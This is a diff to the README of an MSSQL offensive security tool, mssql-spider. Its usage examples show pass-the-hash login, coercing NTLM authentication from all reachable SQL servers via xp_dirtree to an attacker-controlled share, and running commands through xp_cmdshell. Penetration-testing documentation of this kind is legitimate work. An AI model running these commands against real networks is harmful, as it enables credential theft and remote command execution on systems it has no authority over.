@@ -24,20 +24,20 @@ pip install --user git+https://github.com/dadevel/mssql-spider.git@main
 
 # Usage
 
-Impersonate users and follow linked instances recursively.
+Authenticate as local user and enumerate recursively.
 
 ~~~ bash
-mssql-spider -u jdoe -p passw0rd -w db01.corp.local
+mssql-spider -u jdoe -p passw0rd db01.corp.local
 ~~~
 
-Coerce NTLM authentication from all reachable hosts trough `xp_dirtree`.
+Authenticate as domain user via *Pass the Hash* and coerce NTLM authentication from all reachable hosts trough `xp_dirtree`.
 This does not require privileged access.
 
 ~~~ bash
-mssql-spider -u jdoe -H :b9f917853e3dbf6e6831ecce60725930 -w --xpdir \\attacker.corp.local\test ./mssql-servers.txt
+mssql-spider -d corp.local -u jdoe -H :b9f917853e3dbf6e6831ecce60725930 -w --dirtree '\\attacker.corp.local\test' ./mssql-servers.txt
 ~~~
 
-Execute a command on all hosts where you can obtain sysadmin privileges trough `xp_cmdshell`.
+Execute a command trough `xp_cmdshell` on all hosts where you can obtain sysadmin privileges.
 
 ~~~ bash
 mssql-spider -k -n -w -x 'whoami /groups' db01.corp.local:50123 db02.corp.com:1433
